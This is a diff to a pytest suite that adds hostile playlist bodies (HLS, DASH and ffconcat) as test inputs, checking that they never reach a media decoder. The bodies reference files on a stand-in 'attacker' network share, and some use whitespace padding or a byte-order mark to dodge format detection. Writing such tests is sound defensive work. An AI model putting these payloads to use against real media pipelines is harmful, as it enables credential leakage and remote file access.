@@ -703,6 +703,8 @@ def test_fetch_video_refuses_network_share_paths(monkeypatch, no_network, path):
         b"#EXTM3U\n#EXTINF:2.0,\nfile://attacker/share/seg0.ts\n",
         b'<?xml version="1.0"?>\n<!-- ' + b"x" * 4096 + b' -->\n<MPD xmlns="urn:mpeg:dash:schema:mpd:2011"></MPD>',
         b"ffconcat version 1.0\nfile //attacker/share/a.mp4\n",
+        b" " * 70000 + b'<MPD xmlns="urn:mpeg:dash:schema:mpd:2011"></MPD>',
+        b"\xef\xbb\xbf#EXTM3U\nfile://attacker/share/seg0.ts\n",
     ],
 )
 def test_a_downloaded_playlist_never_reaches_the_decoder(monkeypatch, public_dns, tmp_path, body):
@@ -719,7 +721,11 @@ def test_a_downloaded_playlist_never_reaches_the_decoder(monkeypatch, public_dns
 
 @pytest.mark.parametrize(
     "body",
-    [b"#EXTM3U\n#EXTINF:2.0,\nfile://attacker/share/seg0.ts\n", b"ffconcat version 1.0\nfile //attacker/share/a.mp4\n"],
+    [
+        b"#EXTM3U\n#EXTINF:2.0,\nfile://attacker/share/seg0.ts\n",
+        b"ffconcat version 1.0\nfile //attacker/share/a.mp4\n",
+        b" " * 4096 + b'<MPD xmlns="urn:mpeg:dash:schema:mpd:2011"></MPD>',
+    ],
 )
 @pytest.mark.parametrize("encoding", ["base64", "percent"])
 def test_an_inline_data_playlist_never_reaches_the_decoder(monkeypatch, no_network, body, encoding):
